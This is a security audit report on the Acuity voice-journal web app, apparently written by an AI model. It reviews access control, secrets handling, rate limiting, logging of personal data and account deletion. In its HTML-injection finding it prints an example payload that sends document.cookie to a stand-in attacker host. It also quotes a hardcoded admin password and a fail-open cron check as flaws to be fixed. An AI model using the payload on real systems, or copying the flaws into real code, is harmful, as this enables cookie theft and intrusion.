# Acuity — Public-Beta Security Audit

**Date:** 2026-04-19
**Auditor:** Claude (Opus 4.7, 1M context)
**Scope:** Read-only. No code changes.
**Branch / commit at audit time:** `main` / `03281e8`
**Companion docs:** `AUDIT.md` (general codebase audit, 2026-04-17); `CREDENTIAL_LEAK_AUDIT.md` (2026-04-19)

**Threat model snapshot:** Acuity will hold voice recordings of emotional content + transcripts + AI-extracted mental-health signals. For GDPR/CCPA purposes this is **special-category personal data**. Blast radius of any auth/authorization bug is high: cross-tenant read = exposure of a user's nightly emotional debriefs to another user or to the internet.

---

## 0. TL;DR — Do-Not-Launch List

Three findings alone are blocking for any public signup:

| # | Finding | Severity |
|---|---|---|
| A | Admin dashboard protected by **hardcoded password `"acuity-admin-2026"`** literally in the source of a **public** repo | 🔴 CRITICAL |
| B | **RLS status unknown from repo.** No `supabase/` folder, no SQL migrations, no policy files. Because the app uses the **service-role key** end-to-end, RLS is the *only* defense against a service-role-key leak or bucket-misconfig — and we cannot prove it exists | 🔴 CRITICAL |
| C | **No account-deletion path anywhere.** Users cannot delete their data. GDPR Art. 17 / CCPA §1798.105 non-compliance the moment real signups start | 🔴 CRITICAL |

Plus one should-be-critical-by-the-time-of-beta:

| D | **Zero rate limiting** on any endpoint — brute-force on `/api/auth/*`, token-burn on `/api/record` + `/api/weekly`, email-spam reflection via `/api/waitlist` | 🟠 HIGH |

Full prioritized list in §11.

---

## 1. Row-Level Security (Supabase RLS)

### 1.1 Repo-side state: there is no evidence RLS is configured

What I looked for and didn't find:
- No `supabase/` directory at repo root.
- No `migrations/` directory (Prisma uses `prisma db push` — already flagged in `AUDIT.md` §5).
- No `*.sql` policy files anywhere.
- No `ALTER TABLE ... ENABLE ROW LEVEL SECURITY` / `CREATE POLICY` strings in the repo.
- No use of the Supabase anon client for reads of user tables — every per-user DB read in `apps/web/src/app/api/**` goes through **Prisma with the service-role-backed Postgres connection** (`DATABASE_URL` / `DIRECT_URL`). Prisma bypasses RLS because it connects as `postgres` (superuser) or `postgres.<ref>` (pooler bypass user).

**Conclusion: RLS status is unknown from the repo. Treat as NOT ENABLED until confirmed live in Supabase.** `supabaseAnon` is defined in `apps/web/src/lib/supabase.ts:10` but is **not imported anywhere** — it is dead code today. Every actual DB access path today goes through service-role or Prisma-bypass.

### 1.2 Why RLS still matters even though Prisma bypasses it

Three failure modes where RLS is the *only* defense:

1. **Service-role key leak.** Rotated once already (2026-04-18) after a public-repo credential leak. It will happen again.
2. **Audio bucket** — storage RLS is the only tenant boundary between user A's audio and user B's audio. See §4.
3. **Future client-side Supabase use** — if anyone ever adds a `supabaseAnon` query on the mobile app for real-time or offline, RLS becomes the live gate in that second.

### 1.3 Per-table RLS checklist (needs live Supabase inspection)

For each table below, confirm in Supabase dashboard → *Database → Tables → <table> → RLS policies*:

| Table | Must have | Typical policy |
|---|---|---|
| `User` | RLS on; SELECT/UPDATE own row only | `auth.uid() = id` |
| `Account` | RLS on; SELECT own rows only (NEVER return refresh_token/access_token to anon) | `auth.uid() = userId` |
| `Session` | RLS on; anon has no read | NextAuth-managed, server-only |
| `VerificationToken` | RLS on; no anon access at all (tokens are bearer secrets) | deny all to anon |
| `Entry` | RLS on; SELECT/INSERT/UPDATE/DELETE own rows only | `auth.uid() = userId` |
| `Task` | RLS on; own rows only | `auth.uid() = userId` |
| `Goal` | RLS on; own rows only | `auth.uid() = userId` |
| `WeeklyReport` | RLS on; own rows only | `auth.uid() = userId` |
| `LifeMapArea` | RLS on; own rows only | `auth.uid() = userId` |
| `UserMemory` | RLS on; own rows only | `auth.uid() = userId` |
| `Waitlist` | RLS on; **INSERT from anon allowed with rate-limit, SELECT denied to anon** (emails are PII) | policy per-op |

⚠️ Caveat: NextAuth's JWT session strategy (see §6) means `auth.uid()` from Supabase will not work if you ever adopt anon-client reads — you'd be authenticated in NextAuth but anonymous to Supabase. If the product ever needs direct anon queries, plan for Supabase JWTs signed with the same secret.

**Severity: 🔴 CRITICAL** — not because we've proven a gap, but because the only defense is unverifiable from the repo before opening real signups.

**Action:** Before any public signup, someone with Supabase access must screenshot the RLS-enabled state on every table above and paste it into a follow-up doc. If RLS is off anywhere, enable it and ship policies.

---

## 2. API Route Authorization

### 2.1 Ownership-check matrix

Every route under `apps/web/src/app/api/**`:

| Route | Method | Session check | Ownership check | Verdict |
|---|---|---|---|---|
| `/api/auth/[...nextauth]` | GET/POST | NextAuth-managed | n/a | ✅ |
| `/api/record` | POST | `getServerSession` (route.ts:26) | Writes `userId = session.user.id` only | ✅ |
| `/api/entries` | GET | ✅ (route.ts:10) | `where: { userId: session.user.id }` | ✅ |
| `/api/entries/[id]` | GET | ✅ (route.ts:12) | `findUnique(id)` then `if (entry.userId !== session.user.id) 404` (route.ts:36) | ✅ ownership enforced; returns 404 on mismatch (good — no enumeration oracle) |
| `/api/tasks` | GET | ✅ | `where: { userId: session.user.id }` | ✅ |
| `/api/tasks` | POST | ✅ | Writes `userId = session.user.id` | ✅ |
| `/api/tasks` | PATCH | ✅ | `findFirst({ id, userId })` (route.ts:89) before update/delete | ✅ |
| `/api/goals` | GET/POST/PATCH | ✅ | Same pattern as tasks (route.ts:69) | ✅ |
| `/api/weekly` | GET/POST | ✅ | `where: { userId: session.user.id }` | ✅ |
| `/api/lifemap` | GET | ✅ | Scoped to `userId` | ✅ |
| `/api/lifemap/refresh` | POST | ✅ | Scoped to `userId` | ✅ |
| `/api/lifemap/history` | GET | ✅ | Scoped to `userId` | ✅ |
| `/api/stripe/checkout` | POST | ✅ | Fetches own user only; `metadata.userId = session.user.id` | ✅ |
| `/api/stripe/webhook` | POST | Stripe-signature only (no session, correct) | `session.metadata?.userId` trusted from Stripe | ✅ (webhook signature is the gate) |
| `/api/cron/waitlist-drip` | GET | Bearer `CRON_SECRET` **if set** | n/a | 🔴 **Fail-open bug** — see §2.3 |
| `/api/waitlist` | POST | None (public by design) | n/a | ⚠️ See §7 + §8.1 |
| `/api/waitlist/count` | GET | None (public) | Returns aggregate count only | ✅ |
| `/api/admin/dashboard` | GET | **Hardcoded password in source** | n/a | 🔴 CRITICAL — see §5 |

**No IDOR findings on user-scoped routes.** All `/[id]`-style reads that exist (`/api/entries/[id]`) verify ownership and return 404 on mismatch (not 403, so they don't even leak existence).

**Gap by absence:** there is no `DELETE /api/entries/[id]`, no `DELETE /api/weekly/[id]`, no `/api/user` route at all. Users can complete/dismiss tasks and goals but cannot delete their own Entry records or WeeklyReports. Feature gap, not a security gap — but ties into §10.

### 2.2 Route-construction pattern is sound

All user-scoped routes follow one of two safe patterns:
- Filter the query by `userId` at the `where` clause (so the row literally cannot be someone else's).
- `findFirst({ id, userId })` before issuing an `update`/`delete` by id.

Neither pattern has the "fetch by id, then forget to check ownership" bug that produces most IDORs in Next.js apps.

### 2.3 🔴 Cron route is fail-open if env var is missing

`apps/web/src/app/api/cron/waitlist-drip/route.ts:17`:

```ts
if (cronSecret && authHeader !== `Bearer ${cronSecret}`) {
  return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
}
```

If `CRON_SECRET` is unset (empty string or undefined), the short-circuit skips and the route executes. Anyone on the internet can hit `GET /api/cron/waitlist-drip` and trigger an email send to every waitlist signup. Should be fail-closed (`if (!cronSecret || authHeader !== ...)`).

**Severity: 🟠 HIGH** — assumes attacker knows the URL (easy: it's in the repo), assumes `CRON_SECRET` isn't set in Vercel (verifiable in minutes). Abuse = unsolicited email to every user = Resend deliverability hit, spam-filter-trap listing.

---

## 3. Service Role Key Exposure

### 3.1 Where `SUPABASE_SERVICE_ROLE_KEY` is referenced in code

- `apps/web/src/lib/supabase.ts:6` — creates `supabase` client with service role.
- `.env.example:8` — placeholder.
- `turbo.json:16` — listed as a build-time env (for Turbo cache keys).

**That's it.** No mobile app reference, no client component reference.

### 3.2 Import graph — is it ever pulled into a client bundle?

- `@/lib/supabase` is imported only by `apps/web/src/lib/pipeline.ts:38` (`uploadAudio`).
- `pipeline.ts` is imported only by `apps/web/src/app/api/record/route.ts:17`.
- The API route has no `"use client"` and runs on the server.
- No `"use client"` file anywhere in `apps/web/src` imports `@/lib/supabase` or `@/lib/pipeline`.

**Verdict: ✅ service-role key is server-only today.** No `NEXT_PUBLIC_` prefix on it anywhere. No accidental bleed into the bundle.

### 3.3 `NEXT_PUBLIC_*` audit

Only three `NEXT_PUBLIC_*` vars exist and all are appropriate for client exposure:

- `NEXT_PUBLIC_SUPABASE_URL` — project URL, already exposed via `rohjfcenylmfnqoyoirn.supabase.co` DNS.
- `NEXT_PUBLIC_SUPABASE_ANON_KEY` — anon key, public by design; safety depends entirely on RLS (see §1).
- `NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY` — `pk_…`, public by design.
- `NEXT_PUBLIC_GA_MEASUREMENT_ID`, `NEXT_PUBLIC_GOOGLE_SITE_VERIFICATION` — marketing identifiers, public by design.

No sensitive keys are prefixed `NEXT_PUBLIC_`.

**Severity: 🟢 LOW** (but conditional on §1: the anon key's public-by-design status *assumes* RLS).

---

## 4. Audio File Access

**Status (resolved 2026-04-19):** ✅ Bucket is private; signed URLs are issued on demand by an authenticated route with ownership checks; legacy stored-URL pattern is on a deprecation path. End-to-end test against prod confirmed cross-user access denied + public-URL guess rejected. Detail below.

### 4.1 Bucket state — verified

`voice-entries` bucket inspected via the Supabase admin API on 2026-04-19:

```
{
  "id": "voice-entries",
  "public": false,
  "file_size_limit": 26214400,
  "allowed_mime_types": ["audio/webm","audio/mp4","audio/m4a","audio/mpeg","audio/wav","audio/ogg"]
}
```

Surprise finding during inspection: the bucket **didn't exist at all** before this PR — `listBuckets()` returned `[]`. The audio upload code in `apps/web/src/lib/pipeline.ts` was calling `.from("voice-entries").upload(...)` against a bucket that hadn't been provisioned. Any actual `/api/record` sync upload in prod would have failed with a 404 from Supabase. (The 2 prod test users had no entries with audio, so this never surfaced as a real-user incident.) The bucket has now been created **as private**, with a 25 MB size cap and a mime-type allowlist matching `SUPPORTED_AUDIO_TYPES`.

A re-runnable assertion script lives at `scripts/assert-bucket-private.ts` — exits 1 if the bucket is missing or public. Run it after any Supabase dashboard change.

### 4.2 Signed-URL route — `GET /api/entries/[id]/audio`

`apps/web/src/app/api/entries/[id]/audio/route.ts` (new):

- Session required.
- Entry ownership re-checked server-side (`entry.userId !== session.user.id` → 404, deliberately not 403, so the response doesn't confirm the entry exists to a stranger).
- On pass: `supabase.storage.from('voice-entries').createSignedUrl(entry.audioPath, 300)` — 5-minute TTL.
- Returns `{ url, expiresAt }`. `Cache-Control: private, no-store` so no intermediary caches a per-user signed URL.
- In-process rate limit: 60 requests / 60s / userId. **Stopgap** — see §4.5 below for the real-fix dependency on S5.
- Legacy entries that still hold a pre-signed `Entry.audioUrl` (from the sync pipeline before Inngest PR 2) are returned with a `legacy: true` flag and a conservative 30-second client-side hint, so the polling loop refetches soon and rolls onto the new path. New entries from the async pipeline always go through `audioPath` + on-demand signing.

### 4.3 Object path is no longer the security boundary

Pre-resolution risk: with a public bucket, knowing `${userId}/${entryId}.${ext}` would have been enough to retrieve audio. cuids gave practical-but-not-cryptographic protection. Post-resolution: the bucket is private and the only way to retrieve audio is via the signed-URL route, which checks ownership before signing. The object path is back to being just an identifier.

### 4.4 End-to-end verification (2026-04-19, against prod)

Two throwaway users + one test entry with a real (dummy) audio file uploaded to the bucket:

| Test | Result |
|---|---|
| User B requests `GET /api/entries/{A's entry id}/audio` | 404 ✅ |
| User A requests `GET /api/entries/{A's entry id}/audio` | 200 with signed URL ✅ |
| Signed URL fetched directly | 200, 36 bytes returned ✅ |
| Public-URL guess `…/storage/v1/object/public/voice-entries/{path}` | 400 from Supabase (bucket private) ✅ |
| User A requests nonexistent entry id | 404 ✅ |

Test seeded + cleaned up cleanly; no prod data touched.

### 4.5 Open follow-ups

1. **Real rate limiting for `/api/entries/[id]/audio` (and the rest of the API surface).** The in-process limiter is a stopgap; serverless instances don't share memory. SECURITY_AUDIT S5 (Upstash Redis-based limiter for `/api/record`, `/api/weekly`, `/api/lifemap/refresh`, `/api/auth/signin`, `/api/waitlist`) should add this endpoint to its allowlist.
2. **Storage RLS (defence in depth).** Service-role uploads bypass RLS, so writes don't need it. Reads happen via signed URLs (which bypass RLS too — they're tokenized). RLS would matter only if we ever expose the anon Supabase client for direct storage reads, which we don't. Add policy when/if that changes.
3. **`Entry.audioUrl` deprecation.** Column kept for one release per Inngest PR 4 cleanup. Drop it in that PR; the audio route's `legacy: true` branch goes with it.

**Severity: 🟢 RESOLVED** for the cross-user access concern. 🟡 OPEN on rate-limit infra (rolled into S5).

---

## 5. Admin Dashboard

### 5.1 🔴 Hardcoded admin password in public repo

`apps/web/src/app/api/admin/dashboard/route.ts:4`:

```ts
const ADMIN_PASSWORD = "acuity-admin-2026";
```

This is committed to a **public GitHub repo** (`jimheelerdigital/Acuity`). The password is the literal value `acuity-admin-2026`. Anyone on GitHub — or anyone who finds the GitHub source via search — can get into `/admin/dashboard`.

Corroborating weaknesses in the same feature:
- Password transmitted via `x-admin-password` custom header (not Authorization bearer), no HSTS-specific enforcement.
- Client-side store: `sessionStorage.setItem("admin-pw", pw)` (`apps/web/src/app/admin/dashboard/page.tsx:73`) — stores the cleartext password in browser storage, readable by any XSS payload on the same origin. Landing pages load third-party scripts (Meta Pixel, Contentsquare, Hotjar) which already expands the XSS supply chain.
- Constant-time comparison: none. Timing attack is irrelevant at this key length but symptomatic.
- No rate limiting → unlimited guesses.
- No 2FA, no SSO, no audit log of admin actions.

### 5.2 Data the admin dashboard exposes

`apps/web/src/app/api/admin/dashboard/route.ts` returns:
- Total waitlist signups.
- Signups-by-source breakdown.
- Signups-over-time histogram.
- **The 10 most recent signups with `name`, `email`, `source`, `createdAt` in plaintext** (route.ts:44).
- Email-drip-step counts.

So the password gates **actual PII** (names + emails of real people who signed up). That elevates this from "it's just a marketing dashboard" to "unauthorized access here = a breach-notification-worthy disclosure of an email-address list under CCPA."

### 5.3 Required fix before public beta

Minimum viable replacement:
1. Delete `ADMIN_PASSWORD` constant. Replace with `process.env.ADMIN_PASSWORD` **temporarily**, treating it as an interim stopgap only.
2. Real fix: gate with NextAuth session + a `role` or `admins` allowlist (env var: `ADMIN_EMAILS="jim@heelerdigital.com,keenan@heelerdigital.com"`). Reuse the existing auth flow.
3. Remove the `sessionStorage` password cache on the client.
4. Rename the URL to something non-obvious as defense-in-depth (but do not rely on it).

**Severity: 🔴 CRITICAL.**

### 5.4 `robots.ts`

`apps/web/src/app/robots.ts:10` disallows `/admin/` from crawlers. Good hygiene, but security-in-depth, not real security.

---

## 6. Auth Hardening

### 6.1 NextAuth config (`apps/web/src/lib/auth.ts`)

- **Session strategy:** `jwt` (line 66). `maxAge: 30 * 24 * 60 * 60` = 30 days. Reasonable for a consumer app but longer than typical for anything with financial data (Stripe customer IDs, subscription status).
- **JWT secret:** implicit — uses `NEXTAUTH_SECRET`. Confirm it's set in Vercel and at least 32 bytes; rotating it invalidates all sessions (useful during an incident).
- **Cookie defaults:** NextAuth auto-applies `HttpOnly: true`, `SameSite: Lax`, `Secure: true` in production when `NEXTAUTH_URL` is https. No override in code — defaults preserved. ✅
- **CSRF:** NextAuth auto-issues a CSRF double-submit token for `signIn`/`signOut` endpoints. Because all mutating API routes check `session.user.id` (not form-submitted user data) **and** Next.js 14 defaults to `SameSite=Lax` cookies, the CSRF surface is small. ✅ But see 6.5.
- **JWT callback** (line 77) writes `user.id` into `token.id` at first sign-in; `session` callback exposes it as `session.user.id`. ✅

### 6.2 Magic-link flow (Email provider via Resend SMTP)

- The magic-link email body says *"This link expires in 24 hours and can only be used once"* (auth.ts:132). That matches NextAuth defaults for `maxAge` (24h) and `use-once` on `VerificationToken` rows.
- `VerificationToken` table exists (`schema.prisma:37`) — one-time-use enforced at the DB layer by NextAuth (token row deleted on consumption).
- ⚠️ No rate limit on `signIn('email')`. An attacker can email-bomb any address by submitting it on the sign-in form.
- ⚠️ The raw `RESEND_API_KEY` is passed to nodemailer's SMTP auth as the password (auth.ts:44). Works but is an odd pattern since Resend has a proper SDK (used elsewhere). Not a security bug, just drift.

### 6.3 Google OAuth

- `prompt: "consent", access_type: "offline"` (auth.ts:26-30) — standard.
- Redirect URI whitelist is managed in Google Cloud Console (external to repo). Must confirm it lists only `getacuity.io/api/auth/callback/google` + local dev, no wildcards.
- State parameter: NextAuth auto-generates and validates. ✅

### 6.4 Password reset flow

No password auth exists — users sign in only via Google or magic link. **No password-reset flow to secure.** ✅

### 6.5 Session fixation / CSRF verification

- NextAuth rotates session token on login. ✅
- Stripe webhook (`/api/stripe/webhook`) — no CSRF token, correctly; signature is the gate.
- Cron (`/api/cron/waitlist-drip`) — fail-open per §2.3.
- Admin (`/api/admin/dashboard`) — no CSRF token; uses custom header + password. XSS on the admin origin = immediate takeover.

### 6.6 Google OAuth account-linking risk

NextAuth Prisma adapter defaults: if a user signs up with Google using `alice@gmail.com`, then later uses magic link with the same email, the adapter will link them (same `User.email`). Since `emailVerified` is set by both providers, this is OK. But if you ever add another OAuth provider that doesn't pre-verify emails (rare on consumer OAuth), you'd need to guard against account takeover via unverified email.

**Severity: 🟡 MEDIUM** — mainly the 30-day JWT and the lack of rate limits on the magic-link endpoint. NextAuth fundamentals are intact.

---

## 7. Rate Limiting / Abuse Protection

**No rate limiting anywhere in the codebase.** Confirmed:
- No `@upstash/ratelimit` import.
- No middleware-level rate limiter.
- No custom token-bucket code.
- No Supabase-level rate limiting visible from repo.

Exposed endpoints and their abuse vectors:

| Endpoint | Abuse | Cost / blast |
|---|---|---|
| `/api/record` POST | Unlimited 25MB audio uploads per authenticated user | **$$$** — each call = Whisper ($0.006/min) + Claude Opus tokens + Supabase storage. A malicious user or a compromised account can burn $100s/day. |
| `/api/weekly` POST | Unlimited Claude calls per user | Each call is one Opus response. Spike = $. |
| `/api/lifemap/refresh` POST | Unlimited Claude calls per user | Same. |
| `/api/auth/signin` (magic link) | Email bomb any address | Resend deliverability hit; spam-trap listing risk. |
| `/api/auth/callback/google` | Normal OAuth flow | Low risk but default NextAuth has no per-IP brute-force cap. |
| `/api/waitlist` POST | Spam the waitlist with fake emails; **also reflects a welcome email to any address** | Email-bomb amplifier — attacker submits victim's email → victim gets a real "Welcome to Acuity" email from `hello@getacuity.io`. Repeat → your sending reputation dies. |
| `/api/admin/dashboard` | Brute-force the (currently hardcoded) password | See §5. |

**Minimum viable mitigation before beta:**
1. Vercel Edge config / `@upstash/ratelimit` on `/api/record` (e.g., 10/hour per user, 50/day).
2. Per-IP + per-email rate limit on `/api/waitlist` (e.g., 3/hour per IP, 1/day per email).
3. Per-IP rate limit on `/api/auth/signin` email requests (5/hour/IP, 3/day/email).
4. Per-user rate limit on `/api/weekly` and `/api/lifemap/refresh` (e.g., 5/day).

**Severity: 🟠 HIGH** — must ship before public signups.

---

## 8. PII in Logs / Analytics / Error Tracking

### 8.1 🟠 `/api/waitlist/route.ts` logs email + name + source

Lines 9, 10, 17, 27, 29, 33, 41, 45, 54, 57, 59, 83, 84, 93, 95, 99, 102, 111 — **20 `console.log`/`console.error` calls in one 117-line file**. Specifically:

- Line 17: `console.log("[waitlist] parsed body:", { email, name, source })` — logs the user's email, name, and source to Vercel logs on every signup.
- Line 33: `console.log("[waitlist] duplicate check:", existing ? "EXISTS" : "NEW")` — by itself harmless, but paired with line 17 confirms which emails are in the DB.

Vercel logs are retained for 24h on Hobby / 7d on Pro and are visible to anyone with Vercel project access. This is fine for dev, not for a production system with real signups.

### 8.2 🟡 Waitlist email HTML-injects user-supplied fields into admin inbox

`apps/web/src/app/api/waitlist/route.ts:67-73`:

```ts
html: [
  `<p><strong>Name:</strong> ${name || "Not provided"}</p>`,
  `<p><strong>Email:</strong> ${email}</p>`,
  `<p><strong>Source:</strong> ${source || "Direct"}</p>`,
  ...
].join("\n"),
```

The `name` field is user-supplied (from the waitlist form) and gets raw-interpolated into HTML. An attacker can submit `name: "<img src=x onerror=fetch('https://evil.example/steal?c='+document.cookie)>"`. Most modern email clients sandbox/strip active content, but:
- Webmail preview panes can render unsandboxed.
- HTML-injected text can rewrite the admin's mental model of the signup (`name: "Click here: <a href=evil>Legit link</a>"`).
- If the inbox is later piped into any tool (Zapier, Slack email integration), the HTML may execute differently.

**Fix:** escape with a one-liner or use Resend's template primitives. Trivial.

### 8.3 Error responses in production

Checked every `NextResponse.json({ error: ... })`:

- `/api/record` on failure returns `err.message` (route.ts:103) — could leak "Supabase upload failed: <details>", "Anthropic API error: <details>", stack-trace-ish info. Moderate severity because the user is authenticated and the message is usually vendor-specific, not app-internal.
- Everywhere else: generic strings like `"Goal not found"`, `"Invalid action"`. ✅
- Stripe webhook (route.ts:26) returns `err.message` on signature failure — fine, that one's expected.

### 8.4 No error-tracking SDK

No Sentry, no Bugsnag, no Datadog. So PII isn't leaking to a third party — but observability is also absent. If Sentry is added later, **must** scrub email, transcript, entry body before send.

**Severity: 🟡 MEDIUM** on 8.1 (PII in Vercel logs), 🟡 MEDIUM on 8.2 (HTML injection into admin inbox), 🟢 LOW on 8.3.

---

## 9. Sensitive Data in Client Bundle

### 9.1 Client-component inventory

22 `"use client"` files in `apps/web/src`. I spot-checked the import graphs — none of them pull in:
- `@/lib/supabase` (service-role + anon factories) ✅
- `@/lib/prisma` ✅
- `@/lib/stripe` (server Stripe client) ✅
- `@/lib/pipeline`, `@/lib/memory`, `@/lib/resend`, `@/lib/auth` ✅

The only env-var references from client components are `process.env.NEXT_PUBLIC_GA_MEASUREMENT_ID` — safe.

### 9.2 Server-only utilities are not leaking

- `@/lib/auth`'s `getAuthOptions` is invoked only from server files (API routes).
- The server `supabase` client is never imported from a `"use client"` file.
- `ANTHROPIC_API_KEY` / `OPENAI_API_KEY` / `STRIPE_SECRET_KEY` / `RESEND_API_KEY` / `SUPABASE_SERVICE_ROLE_KEY` appear only in server files.

### 9.3 Mobile bundle

`apps/mobile/lib/supabase.ts` creates a Supabase client but is never imported (already flagged in `AUDIT.md` §4 as dead code). Since it's unreferenced, metro doesn't bundle it — but still delete it so a future commit can't silently wire it up to the service-role key.

**Severity: 🟢 LOW** — clean today, but brittle (one misplaced import and the service-role key ships to every browser).

**Hardening:** Rename `apps/web/src/lib/supabase.ts` → `apps/web/src/lib/supabase.server.ts` and add the `server-only` package import at the top — Next.js will then throw at build time if anything client-side imports it.

---

## 10. Data Deletion

### 10.1 🔴 No account-deletion path exists

I grepped for `prisma.user.delete`, `deleteUser`, `deleteAccount`, any DELETE route on `/api/user`, any profile "delete account" UI. **No matches in any form.**

The only deletions that exist in the app:
- `/api/tasks` PATCH with `action: "dismiss"` → deletes a single task (owner-verified) ✅
- Local-state `delete()` on Map objects in UI code (not DB deletions)

### 10.2 🔴 Cascade is broken for the entities we *do* have

Already flagged in `AUDIT.md` §3.5: `Entry`, `Task`, `Goal`, `WeeklyReport`, `LifeMapArea`, `UserMemory` all have `user User @relation(fields: [userId], references: [id])` **without `onDelete: Cascade`**. Meaning: even if you manually run `prisma.user.delete()` in a script, it will either fail with a FK constraint error or (worse, if the DB default is `NO ACTION` / `RESTRICT`) leave orphan rows. No audio file deletion from Supabase Storage is wired up at all.

### 10.3 GDPR / CCPA exposure

The moment a real EU resident signs up:
- **GDPR Art. 17 (Right to Erasure)** — user can request deletion; company has one month to comply. We have no mechanism.
- **Art. 15 (Right of Access)** — user can request all their data. We have no export mechanism either.
- **Art. 20 (Data Portability)** — same.

For a voice-journal product holding mental-health-adjacent data, a DSAR is not a hypothetical — it's a when-not-if. Privacy-conscious users self-select into this product.

### 10.4 What "complete deletion" must cover

A working delete-account feature has to remove, in one transactional operation:

1. `Entry` rows (with cascade → `Task.entryId` fallback).
2. `Task` rows.
3. `Goal` rows.
4. `WeeklyReport` rows.
5. `LifeMapArea` rows.
6. `UserMemory` row.
7. `Account` and `Session` rows (cascade already set).
8. `VerificationToken` rows matching the email.
9. `Waitlist` row if present.
10. All objects in Supabase Storage under `voice-entries/${userId}/*`.
11. Stripe customer archival: either `customers.del()` (hard) or set `subscriptionStatus = "CANCELLED"` + mark email as redacted. Stripe record retention is required by US tax law for ~7 years, so Stripe gets a tombstone, not a delete.
12. Resend: if a suppression list is used, move the email there so drip emails stop firing.
13. PostHog (when it lands): `posthog.capture` + use `reset()` client-side; server-side `distinct_id → alias_id` delete via PostHog API.
14. Finally, `User` row delete.

**Severity: 🔴 CRITICAL** — required before public beta for any plausible jurisdiction with a privacy regime (US states, EU, UK, CA).

---

## 11. Prioritized Fix List

Ordered by what blocks which milestone. Do the 🔴 items in this order; do not skip forward.

### 🔴 Before ANY public signup (hard pre-beta gates)

1. **Delete the hardcoded admin password.** Replace `/api/admin/dashboard` auth with NextAuth session + `ADMIN_EMAILS` allowlist env var. Remove the client-side `sessionStorage.setItem("admin-pw", pw)` cache. (§5)
2. **Verify Supabase RLS live.** Open Supabase dashboard, confirm RLS is enabled on `User`, `Account`, `Session`, `VerificationToken`, `Entry`, `Task`, `Goal`, `WeeklyReport`, `LifeMapArea`, `UserMemory`, `Waitlist`. Paste policy screenshots into a follow-up doc. Enable + write policies wherever it's off. (§1)
3. **Ship account deletion.** New `DELETE /api/user/me` route that purges every table listed in §10.4 in a transaction, then deletes the Supabase Storage prefix, then archives in Stripe. Add `onDelete: Cascade` on the six child relations so the transaction actually works. Surface as "Delete account" in profile. (§10 + `AUDIT.md` §3.5)
~~4.~~ ✅ **DONE 2026-04-19** — `voice-entries` bucket is private; `GET /api/entries/[id]/audio` signs on demand with 5-min TTL after ownership check; cross-user access verified denied against prod. `Entry.audioUrl` legacy column on a deprecation path (Inngest PR 4 cleanup). Storage RLS deferred (service-role uploads + signed-URL reads bypass RLS; only matters if anon client gains direct storage access — see §4.5).

### 🟠 Before public beta launch

~~5.~~ ✅ **DONE 2026-04-20** — `@upstash/ratelimit` + `@upstash/redis` wired across the seven sensitive endpoints with per-category budgets: record/weekly/lifemap-refresh (10/hr/user), auth signin (5/15min/IP), waitlist (3/hr/IP), account delete (3/day/user), audio playback (60/min/user — replaces the S4 in-process stopgap). Helper at `apps/web/src/lib/rate-limit.ts` is fail-open on missing env vars with a one-time console warning. Manual step for Jim: provision Upstash via Vercel marketplace + populate `UPSTASH_REDIS_REST_URL` + `UPSTASH_REDIS_REST_TOKEN` in Production. Tests: 11 Vitest cases covering the wrapper logic, identifier parsing, response builder, fail-open path.
6. **Fix fail-open cron auth.** `/api/cron/waitlist-drip` — change to `if (!cronSecret || authHeader !== ...)`, confirm `CRON_SECRET` is set in Vercel Production. (§2.3)
7. **Stop logging PII from `/api/waitlist`.** Delete the debug `console.log` calls or gate on `NODE_ENV !== "production"`. (§8.1)
8. **Escape waitlist email HTML.** HTML-escape `name`, `email`, `source` before interpolation in the admin notification template. (§8.2)
9. **Rename `lib/supabase.ts` → `lib/supabase.server.ts` with `server-only` import.** Defense in depth against future accidental client import of the service-role client. (§9)

### 🟡 During beta, before scale

10. **Session hygiene.** Shorten JWT `maxAge` from 30d to 7–14d, OR move to DB sessions for better revocation. Add a "Sign out everywhere" button (requires DB sessions). (§6.1)
11. **Add CSP header + Permissions-Policy.** Reduces blast radius of any future XSS. Required anyway for the Contentsquare/Hotjar script mess. (§5 adjacency)
12. **Tighten `/api/record` error surface.** Map vendor errors to generic "Transcription failed. Please try again." before returning. Log the specifics server-side only. (§8.3)
13. **Delete `apps/mobile/lib/supabase.ts`.** Unused and a future footgun. (§9.3)

### 🟢 Post-launch hardening

14. Add Sentry (or similar) with a PII scrubber that strips `email`, `transcript`, `summary`, `wins`, `blockers` fields before send.
15. Replace `ignoreBuildErrors: true` and `ignoreDuringBuilds: true` in `apps/web/next.config.js` — security-sensitive type and lint errors are currently invisible.
16. Add Stripe webhook idempotency (already tracked in `AUDIT.md` §3.6).
17. Move from `prisma db push` to `prisma migrate dev` once real users exist, so every schema change has an audit trail (relevant to compliance evidence if a DSAR investigator asks "when did you add this field?").
18. 2FA on the admin dashboard once it's behind NextAuth (TOTP via a small library).
19. Write a minimal incident-response runbook: credential rotation steps, Supabase audit-log pull, Resend suspend, Vercel redeploy-from-last-known-good.

---

*End of audit. `PROGRESS.md` updated to reflect completion + §11 items added to Next Up.*
